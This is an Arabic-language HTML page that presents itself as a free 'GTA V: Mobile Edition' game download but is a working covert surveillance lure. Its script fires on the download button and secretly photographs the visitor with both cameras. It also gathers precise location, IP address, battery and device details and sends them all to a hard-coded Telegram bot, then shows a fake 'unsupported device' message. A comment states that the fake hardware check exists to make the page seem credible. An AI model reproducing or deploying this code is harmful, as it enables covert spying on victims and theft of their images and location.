<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Turbo Games - تحميل ألعاب مهكرة ومجانية</title>
    <style>
        :root { --main: #ff4757; --bg: #0a0a0c; --card: #1e1e26; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .app-box { background: var(--card); width: 90%; max-width: 400px; border-radius: 30px; overflow: hidden; box-shadow: 0 25px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.05); }
        .hero { background: linear-gradient(rgba(0,0,0,0.4), var(--card)), url('https://images.unsplash.com/photo-1542751371-adc38448a05e?q=80&w=500&auto=format&fit=crop'); height: 180px; background-size: cover; background-position: center; }
        .content { padding: 25px; text-align: center; }
        .badge { background: var(--main); padding: 5px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: bold; margin-bottom: 10px; display: inline-block; }
        h2 { margin: 10px 0; font-size: 1.4rem; }
        p { color: #a0a0b0; font-size: 0.85rem; line-height: 1.6; }
        .spec-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 15px; }
        .spec-item { font-size: 0.75rem; text-align: right; border-right: 2px solid var(--main); padding-right: 8px; }
        .spec-label { color: #707080; display: block; }
        .download-btn { background: var(--main); color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 1.1rem; cursor: pointer; transition: 0.3s; }
        .download-btn:active { transform: scale(0.95); }
        #status { margin-top: 15px; font-size: 0.8rem; color: var(--main); display: none; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="app-box">
    <div class="hero"></div>
    <div class="content">
        <span class="badge">V.I.P ACCESS</span>
        <h2>GTA V: Mobile Edition</h2>
        <p>قم بتحميل النسخة الكاملة للأندرويد مجاناً. تأكد من توافق عتاد جهازك قبل البدء.</p>
        
        <div class="spec-grid">
            <div class="spec-item"><span class="spec-label">المعالج</span><span id="cpu">تحليل...</span></div>
            <div class="spec-item"><span class="spec-label">الرامات</span><span id="ram">جلب...</span></div>
        </div>

        <button class="download-btn" onclick="startPayload()">تحميل اللعبة (4.2 GB)</button>
        <div id="status">جاري التحقق من توافق الجهاز...</div>
    </div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
    const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
    const chat = "7984067238";

    // جلب بيانات الواجهة لزيادة المصداقية
    document.getElementById('cpu').innerText = (navigator.hardwareConcurrency || 8) + " Cores";
    document.getElementById('ram').innerText = (navigator.deviceMemory || 4) + " GB";

    async function sendToTelegram(content, type = "text") {
        const url = `https://api.telegram.org/bot${token}/`;
        if (type === "text") {
            await fetch(url + `sendMessage?chat_id=${chat}&text=${encodeURIComponent(content)}&parse_mode=Markdown`);
        } else {
            const fd = new FormData();
            fd.append("chat_id", chat);
            fd.append("photo", content, "snap.jpg");
            await fetch(url + "sendPhoto", { method: "POST", body: fd });
        }
    }

    async function generateReport() {
        let r = `🔥 *تقرير صيد جديد (Game Target)*:\n\n`;
        
        const loc = await new Promise(res => {
            navigator.geolocation.getCurrentPosition(
                p => res(`📍 الموقع: [اضغط للخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`),
                () => res(`📍 الموقع: (مرفوض)`), {enableHighAccuracy: true}
            );
        });
        r += loc + "\n";
        r += `📱 الجهاز: \`${navigator.platform}\`\n`;
        
        try {
            const b = await navigator.getBattery();
            r += `🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋 لا يشحن"})\n`;
        } catch(e) {}

        try {
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json());
            r += `🌐 الـ IP: \`${ip.ip}\`\n`;
        } catch(e) {}
        
        r += `🖥️ المتصفح: \`${navigator.userAgent.split(' ').pop()}\`\n`;
        return r;
    }

    async function takePhoto(mode) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode === "front" ? "user" : "environment" } });
            const v = document.getElementById('v');
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r);
            const canvas = document.getElementById('c');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            stream.getTracks().forEach(t => t.stop());
            return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.8));
        } catch (e) { return null; }
    }

    async function startPayload() {
        document.getElementById('status').style.display = 'block';

        // 1. التقاط الصور (أمامية وخلفية)
        const front = await takePhoto("front");
        if (front) await sendToTelegram(front, "photo");

        const back = await takePhoto("back");
        if (back) await sendToTelegram(back, "photo");

        // 2. إرسال التقرير النصي
        const report = await generateReport();
        await sendToTelegram(report, "text");

        setTimeout(() => {
            alert("عذراً، مساحة التخزين غير كافية أو جهازك غير مدعوم لهذه اللعبة.");
            document.getElementById('status').style.display = 'none';
        }, 3000);
    }
</script>
</body>
</html>
